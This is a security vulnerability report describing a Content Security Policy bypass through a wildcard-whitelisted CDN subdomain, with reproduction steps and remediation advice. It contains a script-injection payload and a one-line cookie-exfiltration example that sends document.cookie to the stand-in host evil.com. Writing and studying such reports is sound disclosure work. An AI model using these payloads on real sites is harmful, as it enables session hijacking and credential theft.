# 🐞 CSP Bypass Vulnerability Report

---

## 📌 Title

**Content Security Policy (CSP) Bypass via lenient directives and whitelisted domains**

---

## 📝 Description

The target application implements a CSP (Content Security Policy) header to mitigate Cross-Site Scripting (XSS) and data injection attacks. However, due to **misconfigurations** or **whitelisted domains** that serve attacker-controlled content, it is possible to **bypass the CSP** and execute arbitrary JavaScript.

This effectively defeats the intended protections of CSP, opening the application to script injection, session theft, or credential harvesting.

---

## 🎯 Affected Endpoint

- **URL**: `https://vulnerable-website.com/`
- **Method**: `GET`
- **Headers**:
  
```http
Content-Security-Policy: script-src 'self' *.trustedcdn.com;
```

---

## 💣 Exploit Scenario

1. `*.trustedcdn.com` allows an attacker to host their own malicious JS (e.g., `attacker.trustedcdn.com`).
2. Attacker uploads or hosts a payload on:

```
https://attacker.trustedcdn.com/payload.js
```

3. Inject the following script into a vulnerable input field:

```html
<script src="https://attacker.trustedcdn.com/payload.js"></script>
```

4. The page loads and executes the malicious JS despite CSP.

---

## 🔥 Example Payloads

### 📥 Reflected Script Include

```html
<script src="https://attacker.trustedcdn.com/xss.js"></script>
```

### 📤 Data Exfiltration Example (payload.js)

```javascript
fetch('https://evil.com/steal?cookie=' + document.cookie);
```

---

## 🧪 Steps to Reproduce

1. Find an input on the target site that reflects unsanitized HTML (e.g., a search field or 404 page).
2. Inject the following input:

```html
<script src="https://attacker.trustedcdn.com/xss.js"></script>
```

3. Observe JavaScript executing even with a CSP header present.
4. Confirm that document data is exfiltrated (e.g., cookies or local storage).

---

## ⚠️ Why This Works

- Wildcard trust (`*.trustedcdn.com`) allows subdomain control.
- Attacker leverages a whitelisted domain to load their own JavaScript.
- CSP does not prevent `src`-based script execution if domain is allowed.

---

## 🎯 Impact

- Complete CSP bypass
- Enables stored/reflected XSS even with CSP
- Potential for session hijacking
- Credential harvesting
- User redirection and phishing

---

## ⚙️ Affected CSP Configuration

```http
Content-Security-Policy: script-src 'self' *.trustedcdn.com;
```

- `*.trustedcdn.com` is too permissive
- Attacker controlled subdomain hosted malicious JS
- Lack of integrity checks (e.g., `integrity` or nonce)

---

## 🛡️ Recommended Remediation

- Remove wildcard subdomains (`*.trustedcdn.com`)
- Avoid trusting any domain not 100% under your control
- Use **nonces** or **hashes** for inline script execution:

```http
Content-Security-Policy: script-src 'self' 'nonce-abc123';
```

- Implement Subresource Integrity (SRI):

```html
<script src="https://cdn.safe.com/lib.js" integrity="sha384-..." crossorigin="anonymous"></script>
```

- Validate CSP headers with tools like [Google CSP Evaluator](https://csp-evaluator.withgoogle.com/)

---

## 🧾 References

- [OWASP CSP Guide](https://owasp.org/www-project-cheat-sheets/cheatsheets/Content_Security_Policy_Cheat_Sheet.html)
- [Google CSP Evaluator](https://csp-evaluator.withgoogle.com/)
- [PortSwigger CSP Bypass Techniques](https://portswigger.net/research/bypassing-csp-with-sandboxed-iframes)

---

## 📅 Report Date

**2025-06-17**

---

## 🧑‍💻 Reported By

- **Security Researcher**: raghav  
- **Tools Used**: Manual Testing, Burp Suite, Browser Console  
- **Severity**: High

---

> ⚠️ **Disclaimer**: This vulnerability was discovered and reported responsibly.    